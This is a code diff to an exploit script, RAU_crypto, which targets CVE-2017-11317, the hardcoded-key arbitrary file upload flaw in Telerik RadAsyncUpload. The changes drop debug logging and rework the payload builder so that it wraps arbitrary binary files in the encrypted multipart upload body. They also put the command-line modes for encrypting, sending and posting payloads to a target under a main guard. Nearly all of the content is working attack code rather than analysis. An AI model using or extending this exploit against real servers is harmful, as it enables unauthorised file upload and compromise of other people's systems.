@@ -140,7 +140,6 @@ class RAUCipher:
 #    print(binascii.hexlify(iv).decode().upper())
 
     def encrypt(plaintext):
-        sys.stderr.write("Encrypting... ")
         encoded = ""
         for i in plaintext:
             encoded = encoded + i + "\x00"
@@ -149,16 +148,13 @@ class RAUCipher:
                                 (16 - (len(encoded) % 16))
                             )
         cipher = AES.new(RAUCipher.key, AES.MODE_CBC, RAUCipher.iv)
-        sys.stderr.write("done\n")
         return base64.b64encode(cipher.encrypt(plaintext.encode())).decode()
 
 
     def decrypt(ciphertext):
-        sys.stderr.write("Decrypting... ")
         ciphertext = base64.b64decode(ciphertext)
         cipher = AES.new(RAUCipher.key, AES.MODE_CBC, RAUCipher.iv)
         unpad = lambda s: s[0:-ord(chr(s[-1]))]
-        sys.stderr.write("done\n")
         return unpad(cipher.decrypt(ciphertext)).decode()[0::2]
 
 
@@ -227,34 +223,37 @@ def payload(TempTargetFolder, Version, payload_filename):
     payload_file_data = payload_file.read()
     payload_file.close()
 
-    data = rauPostData_prep(TempTargetFolder, Version)
-    data += "-----------------------------62616f37756f2f\r\n"
-    data += "Content-Disposition: form-data; name=\"file\"; filename=\"blob\"\r\n"
-    data += "Content-Type: application/octet-stream\r\n"
-    data += "\r\n"
-    data += payload_file_data.decode("raw_unicode_escape") + "\r\n"
-    data += "-----------------------------62616f37756f2f\r\n"
-    data += "Content-Disposition: form-data; name=\"fileName\"\r\n"
-    data += "\r\n"
-    data += "RAU_crypto.bypass\r\n"
-    data += "-----------------------------62616f37756f2f\r\n"
-    data += "Content-Disposition: form-data; name=\"contentType\"\r\n"
-    data += "\r\n"
-    data += "text/html\r\n"
-    data += "-----------------------------62616f37756f2f\r\n"
-    data += "Content-Disposition: form-data; name=\"lastModifiedDate\"\r\n"
-    data += "\r\n"
-    data += "2019-01-02T03:04:05.067Z\r\n"
-    data += "-----------------------------62616f37756f2f\r\n"
-    data += "Content-Disposition: form-data; name=\"metadata\"\r\n"
-    data += "\r\n"
-    data += "{\"TotalChunks\":1,\"ChunkIndex\":0,\"TotalFileSize\":1,\"UploadID\":\"" + \
-            payload_filebasename + "\"}\r\n"
-    data += "-----------------------------62616f37756f2f--\r\n"
-    data += "\r\n"
+    data1 = rauPostData_prep(TempTargetFolder, Version)
+    data1 += "-----------------------------62616f37756f2f\r\n"
+    data1 += "Content-Disposition: form-data; name=\"file\"; filename=\"blob\"\r\n"
+    data1 += "Content-Type: application/octet-stream\r\n"
+    data1 += "\r\n"
+
+    data2 = "\r\n"
+    data2 += "-----------------------------62616f37756f2f\r\n"
+    data2 += "Content-Disposition: form-data; name=\"fileName\"\r\n"
+    data2 += "\r\n"
+    data2 += "RAU_crypto.bypass\r\n"
+    data2 += "-----------------------------62616f37756f2f\r\n"
+    data2 += "Content-Disposition: form-data; name=\"contentType\"\r\n"
+    data2 += "\r\n"
+    data2 += "text/html\r\n"
+    data2 += "-----------------------------62616f37756f2f\r\n"
+    data2 += "Content-Disposition: form-data; name=\"lastModifiedDate\"\r\n"
+    data2 += "\r\n"
+    data2 += "2019-01-02T03:04:05.067Z\r\n"
+    data2 += "-----------------------------62616f37756f2f\r\n"
+    data2 += "Content-Disposition: form-data; name=\"metadata\"\r\n"
+    data2 += "\r\n"
+    data2 += "{\"TotalChunks\":1,\"ChunkIndex\":0,\"TotalFileSize\":1,\"UploadID\":\"" + payload_filebasename + "\"}\r\n"
+    data2 += "-----------------------------62616f37756f2f--\r\n"
+    data2 += "\r\n"
+
+    # Concatenate text fields with binary data.
+    with open(payload_filename, "rb") as f:
+        data = bytes(data1, 'utf8') + f.read() + bytes(data2, 'utf8')
     sys.stderr.write("Payload prep done\n")
     return data
-
 
 def upload(data, url, proxy = False):
 
@@ -385,34 +384,35 @@ def mode_help():
         "N.B. Advanced settings e.g. custom keys or PBKDB algorithm can be found by searching source code for: ADVANCED_SETTINGS\n"
     )
 
+if __name__ == "__main__":
 
-sys.stderr.write("\nRAU_crypto by Paul Taylor / @bao7uo \n")
-sys.stderr.write(
-        "CVE-2017-11317 - " +
-        "Telerik RadAsyncUpload hardcoded keys / arbitrary file upload\n\n"
-        )
+    sys.stderr.write("\nRAU_crypto by Paul Taylor / @bao7uo \n")
+    sys.stderr.write(
+            "CVE-2017-11317 - " +
+            "Telerik RadAsyncUpload hardcoded keys / arbitrary file upload\n\n"
+            )
 
-if len(sys.argv) < 2:
-    mode_help()
-elif sys.argv[1] == "-d" and len(sys.argv) == 3:
-    mode_decrypt()
-elif sys.argv[1] == "-D" and len(sys.argv) == 3:
-    mode_Decrypt_rauPostData()
-elif sys.argv[1] == "-e" and len(sys.argv) == 3:
-    mode_encrypt()
-elif sys.argv[1] == "-E" and len(sys.argv) == 4:
-    mode_Encrypt_rauPostData()
-elif sys.argv[1] == "-c" and len(sys.argv) == 4:
-    mode_encrypt_custom_Payload()
-elif sys.argv[1] == "-C" and len(sys.argv) == 5:
-    mode_send_custom_Payload()
-elif sys.argv[1] == "-C" and len(sys.argv) == 6:
-    mode_send_custom_Payload_proxy()   
-elif sys.argv[1] == "-p" and len(sys.argv) == 5:
-    mode_payload()
-elif sys.argv[1] == "-P" and len(sys.argv) == 6:
-    mode_Post()
-elif sys.argv[1] == "-P" and len(sys.argv) == 7:
-    mode_Post_Proxy()
-else:
-    mode_help()
+    if len(sys.argv) < 2:
+        mode_help()
+    elif sys.argv[1] == "-d" and len(sys.argv) == 3:
+        mode_decrypt()
+    elif sys.argv[1] == "-D" and len(sys.argv) == 3:
+        mode_Decrypt_rauPostData()
+    elif sys.argv[1] == "-e" and len(sys.argv) == 3:
+        mode_encrypt()
+    elif sys.argv[1] == "-E" and len(sys.argv) == 4:
+        mode_Encrypt_rauPostData()
+    elif sys.argv[1] == "-c" and len(sys.argv) == 4:
+        mode_encrypt_custom_Payload()
+    elif sys.argv[1] == "-C" and len(sys.argv) == 5:
+        mode_send_custom_Payload()
+    elif sys.argv[1] == "-C" and len(sys.argv) == 6:
+        mode_send_custom_Payload_proxy()
+    elif sys.argv[1] == "-p" and len(sys.argv) == 5:
+        mode_payload()
+    elif sys.argv[1] == "-P" and len(sys.argv) == 6:
+        mode_Post()
+    elif sys.argv[1] == "-P" and len(sys.argv) == 7:
+        mode_Post_Proxy()
+    else:
+        mode_help()
